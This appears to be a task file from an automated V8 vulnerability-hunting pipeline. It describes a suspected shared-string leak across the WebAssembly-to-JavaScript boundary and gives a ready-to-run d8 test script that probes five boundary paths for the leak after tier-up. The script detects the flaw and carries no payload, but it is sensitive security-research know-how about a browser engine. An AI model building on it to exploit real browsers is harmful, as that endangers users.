# Genome 047 — shared-boundary-comprehensive

## Hypothesis
TC-003/TC-004 confirmed: shared strings leak through Wasm compiled wrapper because wrappers-inl.h:138 only checks `IsSubtypeOf(type, kWasmSharedExternRef)`. This misses shared strings passing through ANY non-shared-extern type. The working exploit uses `SharedStructType` to create shared strings in JS, passes them through a regular `externref` Wasm function, and detects the leak after tier-up.

This pattern applies to ALL Wasm→JS boundary paths:
1. **Function returns** — CONFIRMED (externref, anyref)
2. **Global.get** — UNTESTED: If a Wasm global holds a shared string, does global.get unshare?
3. **Multi-return** — UNTESTED: Each return value processed separately via WasmToJSObject
4. **Table.get from JS** — UNTESTED: WebAssembly.Table.get() returns values to JS
5. **Exception values** — UNTESTED: Wasm exceptions caught in JS carry values

## Ready-to-Run Test

Save as `/tmp/test_shared_boundary_all.js`:

```javascript
// Flags: --experimental-wasm-shared --allow-natives-syntax --shared-string-table --harmony-struct
load('/Users/t/v8/test/mjsunit/wasm/wasm-module-builder.js');

// Create a shared string via SharedStructType
let sharedJSStruct = new (new SharedStructType(['str']));
sharedJSStruct.str = 'leak-test';
let sharedStr = sharedJSStruct.str;
print('Setup: sharedStr isShared=' + %IsSharedString(sharedStr));

function tierUp(fn, arg, n) {
  for (let i = 0; i < (n || 10000); i++) fn(arg);
}

// TEST 1: Function return (baseline — known DIRTY)
(function TestFuncReturn() {
  let b = new WasmModuleBuilder();
  b.addFunction('f', makeSig([kWasmExternRef], [kWasmExternRef]))
    .addBody([kExprLocalGet, 0]).exportFunc();
  let inst = b.instantiate();
  let before = %IsSharedString(inst.exports.f(sharedStr));
  tierUp(inst.exports.f, sharedStr);
  let after = %IsSharedString(inst.exports.f(sharedStr));
  print('TEST1 func_return: before=' + before + ' after=' + after +
        (after && !before ? ' *** DIRTY ***' : ' CLEAN'));
})();

// TEST 2: Global.get from JS API
(function TestGlobalGet() {
  try {
    let b = new WasmModuleBuilder();
    let g = b.addGlobal(kWasmExternRef, true, false,
      [kExprRefNull, kExternRefCode]);
    b.addFunction('set_global', makeSig([kWasmExternRef], []))
      .addBody([kExprLocalGet, 0, kExprGlobalSet, g.index]).exportFunc();
    b.addFunction('get_global', makeSig([], [kWasmExternRef]))
      .addBody([kExprGlobalGet, g.index]).exportFunc();
    let inst = b.instantiate();
    inst.exports.set_global(sharedStr);
    let before = %IsSharedString(inst.exports.get_global());
    tierUp(inst.exports.get_global, undefined);
    let after = %IsSharedString(inst.exports.get_global());
    print('TEST2 global_get: before=' + before + ' after=' + after +
          (after && !before ? ' *** DIRTY ***' : ' CLEAN'));
  } catch(e) { print('TEST2 ERROR: ' + e.message); }
})();

// TEST 3: Multi-return
(function TestMultiReturn() {
  try {
    let b = new WasmModuleBuilder();
    b.addFunction('multi', makeSig([kWasmExternRef], [kWasmExternRef, kWasmExternRef]))
      .addBody([kExprLocalGet, 0, kExprLocalGet, 0]).exportFunc();
    let inst = b.instantiate();
    let [r1, r2] = inst.exports.multi(sharedStr);
    let b1 = %IsSharedString(r1);
    tierUp((s) => inst.exports.multi(s), sharedStr);
    let [r3, r4] = inst.exports.multi(sharedStr);
    let a1 = %IsSharedString(r3);
    print('TEST3 multi_return: before=' + b1 + ' after=' + a1 +
          (a1 && !b1 ? ' *** DIRTY ***' : ' CLEAN'));
  } catch(e) { print('TEST3 ERROR: ' + e.message); }
})();

// TEST 4: Table.get from JS
(function TestTableGet() {
  try {
    let b = new WasmModuleBuilder();
    let t = b.addTable(kWasmExternRef, 1, 1);
    b.addFunction('set_table', makeSig([kWasmExternRef], []))
      .addBody([kExprI32Const, 0, kExprLocalGet, 0, kExprTableSet, t.index]).exportFunc();
    b.addExportOfKind('table', kExternalTable, t.index);
    let inst = b.instantiate();
    inst.exports.set_table(sharedStr);
    let val = inst.exports.table.get(0);
    let isShared = %IsSharedString(val);
    print('TEST4 table_get: isShared=' + isShared +
          (isShared ? ' *** DIRTY ***' : ' CLEAN'));
  } catch(e) { print('TEST4 ERROR: ' + e.message); }
})();

// TEST 5: Exception value
(function TestException() {
  try {
    let b = new WasmModuleBuilder();
    let tag = b.addTag(makeSig([kWasmExternRef], []));
    b.addFunction('throw_shared', makeSig([kWasmExternRef], []))
      .addBody([kExprLocalGet, 0, kExprThrow, tag]).exportFunc();
    b.addExportOfKind('tag', kExternalTag, tag);
    let inst = b.instantiate();
    try {
      inst.exports.throw_shared(sharedStr);
    } catch(e) {
      if (e instanceof WebAssembly.Exception) {
        let val = e.getArg(inst.exports.tag, 0);
        let isShared = %IsSharedString(val);
        print('TEST5 exception: isShared=' + isShared +
              (isShared ? ' *** DIRTY ***' : ' CLEAN'));
      }
    }
  } catch(e) { print('TEST5 ERROR: ' + e.message); }
})();
```

Run with:
```bash
/Users/t/v8/out/fuzzbuild/d8 --experimental-wasm-shared --allow-natives-syntax --shared-string-table --harmony-struct /tmp/test_shared_boundary_all.js
```

## Evolution Plan
- v1: Run the comprehensive test above. Post ALL results.
- v2: For any DIRTY results, minimize the test case and confirm tier-up dependency.
- v3: For CLEAN results that should be DIRTY, investigate why (different wrapper path? different conversion?).

## Task
**RUN THE TEST FIRST.** Save to /tmp and execute. Post ALL output immediately. Each TEST result is a separate data point for the TC-003 pattern export.

Post with tags `shared-string,boundary,comprehensive,pattern-export,tc-003,tc-004`.
